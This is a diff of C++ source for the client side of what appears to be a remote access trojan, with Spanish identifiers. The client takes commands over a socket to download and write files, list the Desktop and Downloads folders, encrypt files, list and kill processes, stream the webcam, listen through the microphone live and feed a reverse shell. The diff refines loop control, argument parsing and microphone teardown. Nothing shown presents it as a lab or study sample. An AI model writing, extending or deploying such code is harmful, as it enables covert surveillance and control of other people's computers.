@@ -85,14 +85,17 @@ void Cliente::MainLoop() {
     //Esperar por comandos
     char cBuffer[1024 * 100]; //100 kb (transferencia de archivos)
     memset(&cBuffer, 0, sizeof(cBuffer));
-    while (this->isRunning) {
+    while (true) {
+        std::unique_lock<std::mutex> lock(this->mtx_running);
+        if (!this->isRunning) {
+            break;
+        }
+        lock.unlock();
+
         //Limpiar el buffer
         if (cBuffer[0] != 0) {
             memset(&cBuffer, 0, sizeof(cBuffer));
         }
-
-        //Espere el comando en modo block
-        //DebugPrint("[!] Esperando comando");
 
         int iRecibido = this->cRecv(this->sckSocket, cBuffer, sizeof(cBuffer), false);
 
@@ -101,7 +104,9 @@ void Cliente::MainLoop() {
             break;
         }
 
-        this->ProcesarComando(cBuffer, iRecibido);
+        if (iRecibido > 0) {
+            this->ProcesarComando(cBuffer, iRecibido);
+        }
 
     }
 
@@ -159,9 +164,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo_Init){
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 4);
         if(strIn.size() == 3){
-
             DebugPrint("[!] Descargando archivo en ruta " + strIn[1] + " | size: " + strIn[2]);
-
             if((this->fpArchivo = fopen(strIn[1].c_str(), "wb")) == nullptr){
                 DebugPrint("[X] No se pudo abrir el archivo " + strIn[1]);
             }
@@ -171,15 +174,11 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         return;
     }
 
-    strIn = strSplit(std::string(pBuffer), CMD_DEL, 4);
-
-    int iEnviado = 0;
-    
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::PING) {
         DebugPrint("[!]PING");
         std::string strComand = std::to_string(EnumComandos::PONG);
         strComand.append(1, CMD_DEL);
-        iEnviado = this->cSend(this->sckSocket, strComand.c_str(), strComand.size()+1, 0, false);
+        this->cSend(this->sckSocket, strComand.c_str(), strComand.size()+1, 0, false);
         return;
     }
 
@@ -218,13 +217,13 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
 
     //Lista directorio
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Dir_Folder){
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
         std::string strPath = "";
         if (strIn[1] == "DESCAR-DOWN") {
             strPath = this->ObtenerDown();
             std::string strPathBCDown = std::to_string(EnumComandos::FM_CPATH);
             strPathBCDown.append(1, CMD_DEL);
             strPathBCDown += strPath;
-            //Enviar ruta del directorio al servidor
             this->cSend(this->sckSocket, strPathBCDown.c_str(), strPathBCDown.size(), 0, true);
             Sleep(10);
         } else if (strIn[1] == "ESCRI-DESK") {
@@ -232,7 +231,6 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
             std::string strPathBCDesk = std::to_string(EnumComandos::FM_CPATH);
             strPathBCDesk.append(1, CMD_DEL);
             strPathBCDesk += strPath;
-            //lios mismo aqui
             this->cSend(this->sckSocket, strPathBCDesk.c_str(), strPathBCDesk.size(), 0, true);
             Sleep(10);
         } else {
@@ -243,7 +241,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
             strCommand.append(1, CMD_DEL);
             strCommand.append(item);
             this->cSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true);
-            Sleep(30);
+            Sleep(20);
         }
         return;
     }
@@ -294,11 +292,12 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         std::string strBuffer = std::string(cBytes);
 
         EditarArchivo_Guardar(strIn[1], strBuffer.c_str(), static_cast<std::streamsize>(iSize) - iHeader);
-
+        return;
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Crypt_Archivo) {
         Crypt_Archivo(strIn[2], strIn[1][0], strIn[1][1], strIn[3]);
+        return;
     }
     //#####################################################
 
@@ -311,14 +310,16 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         std::string strProc = std::to_string(EnumComandos::PM_Lista);
         strProc.append(1, CMD_DEL);
         strProc += strProcessList();
-        iEnviado = this->cSend(this->sckSocket, strProc.c_str(), strProc.size(), 0, false);
+        this->cSend(this->sckSocket, strProc.c_str(), strProc.size(), 0, false);
         return;
     }
     
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::PM_Kill) {
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
         if (!EndProcess(atoi(strIn[1].c_str()))) {
             DebugPrint("[X] No se pudo terminar el PID " + strIn[1]);
         }
+
         return;
     }
 
@@ -370,12 +371,13 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
             strPaquete += "Nica|Nica2 :v";
         }
         DebugPrint(strPaquete);
-        iEnviado = this->cSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true);
+        this->cSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true);
 
         return;
     }
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Single) {
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
         if (!this->mod_Cam) {
             this->mod_Cam = new mod_Camera();
             this->mod_Cam->ListNameCaptureDevices();
@@ -451,6 +453,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     }
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Live_Start) {
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
         u_int iDeviceIndex = atoi(strIn[1].c_str());
         if (!this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
             this->mod_Cam->SpawnLive(iDeviceIndex);
@@ -480,6 +483,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
 
     //Escuchar mic en tiempo real
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Iniciar_Escucha) {
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
         if (this->mod_Mic == nullptr) {
             this->mod_Mic = new Mod_Mic(this);
         }
@@ -490,14 +494,13 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     }
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Detener_Escucha) {
-        if (this->mod_Mic == nullptr) {
-            this->mod_Mic = new Mod_Mic(this);
+        if (this->mod_Mic != nullptr) {
+            this->mod_Mic->sckSocket = this->sckSocket;
+            this->mod_Mic->m_DetenerLive();
+            Sleep(100);
+            delete this->mod_Mic;
+            this->mod_Mic = nullptr;
         }
-        this->mod_Mic->sckSocket = this->sckSocket;
-        this->mod_Mic->m_DetenerLive();
-        Sleep(100);
-        delete this->mod_Mic;
-        this->mod_Mic = nullptr;
         return;
     }
     //#####################################################
@@ -520,13 +523,9 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
 
     //Escribir comando a la shell
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::Reverse_Shell_Command) {
+        char* cData = pBuffer + strIn[0].size() + 1;
         if (this->reverseSHELL) {
-            std::string strJoined = "";
-            for (int i = 1; i < int(strIn.size()); i++) {
-                strJoined += strIn[i] + "~";
-            }
-            strJoined = strJoined.substr(0, strJoined.size() - 1);
-
+            std::string strJoined = std::string(cData);
             this->reverseSHELL->thEscribirShell(strJoined);
 
             if (strJoined == "exit\r\n") {
@@ -701,12 +700,12 @@ std::string Cliente::ObtenerDown() {
                 return strRutaDesc + "\\";
             }
             else {
-                return std::string("N/A");
+                return std::string("-");
             };
         }
     }
     else {
-        return std::string("N/A");
+        return std::string("-");
     }
 }
 
